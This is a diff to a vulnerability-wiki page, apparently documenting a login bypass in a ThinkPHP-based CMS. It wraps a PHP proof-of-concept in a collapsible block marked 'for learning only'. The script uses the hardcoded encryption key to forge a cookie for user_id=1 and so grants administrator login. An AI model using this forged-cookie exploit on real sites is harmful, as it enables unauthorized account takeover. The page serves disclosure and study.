@@ -165,18 +165,20 @@ function is_login()
         return session('user_auth_sign') == data_auth_sign($user) ? $user['uid'] : 0;
     }
 }
-```
+<details>
+<summary>POC 代码（点击展开 · 仅供学习，请勿用于非授权测试）</summary>
 
+<pre><code class="language-text">
 根据这里得到的代码，可以知道当**user_Id=1**时,会解密密钥后判断是否正确，如果正确则可以登录系统
 
 我们在本地使用加密代码加密**user_id=1**得到的cookie则可以登录系统
 
 ```php
-<?php
+&lt;?php
 show_source(__FILE__);
 function think_encrypt($data, $key = '', $expire = 0)
 {
-    $key = '+0SeoAC#YR,Jm&c?[PhUg9u;:Drd8Fj4q|XOkx*T';
+    $key = '+0SeoAC#YR,Jm&amp;c?[PhUg9u;:Drd8Fj4q|XOkx*T';
     $key = md5($key);
 
     $data = base64_encode($data);
@@ -185,7 +187,7 @@ function think_encrypt($data, $key = '', $expire = 0)
     $l = strlen($key);
     $char = '';
 
-    for ($i = 0; $i < $len; $i++) {
+    for ($i = 0; $i &lt; $len; $i++) {
         if ($x == $l) {
             $x = 0;
         }
@@ -196,7 +198,7 @@ function think_encrypt($data, $key = '', $expire = 0)
 
     $str = sprintf('%010d', $expire ? $expire + time() : 0);
 
-    for ($i = 0; $i < $len; $i++) {
+    for ($i = 0; $i &lt; $len; $i++) {
         $str .= chr(ord(substr($data, $i, 1)) + (ord(substr($char, $i, 1))) % 256);
     }
     return str_replace(array(
@@ -210,9 +212,10 @@ function think_encrypt($data, $key = '', $expire = 0)
     ), base64_encode($str));
 }
 
-echo 'user_id = ' . think_encrypt($_GET['user_id']);
-?>
-```
+echo 'user_id = ' . think_encrypt(&#36;_GET['user_id']);
+?&gt;</code></pre>
+
+</details>
 
 ![](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/cms/images/202202162320334.png)
 
